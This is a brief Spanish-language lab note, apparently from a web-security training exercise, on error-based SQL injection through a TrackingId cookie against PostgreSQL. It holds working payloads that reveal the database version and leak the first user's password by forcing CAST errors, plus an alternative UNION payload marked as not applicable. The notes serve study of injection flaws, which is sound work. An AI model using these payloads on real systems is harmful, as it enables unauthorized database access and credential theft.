
Postgres encontrado

```R
TrackingId='+AND+1=CAST((SELECT+version()+FROM+users+LIMIT+1)+AS+int)--+-
```

![[Pasted image 20250104213054.png]]

La contraseña del primer usuario se leakea con esta query
```R
TrackingId='+AND+1=CAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)--+-
```

O de otra forma (NO APLICA)


```R
TrackingId='+UNION+SELECT+1=CAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)--+-
```